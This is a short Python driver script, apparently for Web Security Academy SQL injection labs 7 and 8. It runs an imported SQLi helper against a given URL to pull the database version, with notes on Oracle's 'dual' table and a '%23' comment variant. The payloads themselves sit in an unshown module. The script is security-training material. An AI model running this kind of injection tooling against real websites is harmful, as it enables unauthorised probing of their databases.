from methods import SQLi,path
import sys




if __name__=="__main__":
    try:
        print("INFO: "+", ".join(sys.argv))
        url=sys.argv[1].strip()    
        n=len(sys.argv) 
        
        lab7=SQLi(url,path,table="dual")#Note: FOr lab8 add comment="%23" // lab7 in oracle it is important to add table
        vers=lab7.find_version()

        #lab8=SQLi(url,path,comment="%23")
        #vers=lab8.find_version()
        
        print("\n[+] Resultat :\n\r")
        print(vers[1])
    except IndexError:
        print(f"[?] Syntax: python3 {sys.argv[0].strip()} <url>")
        print(f'[?] Example: python3 {sys.argv[0].strip()} "https://sub.web-security-academy.net" ')
        exit(-1)
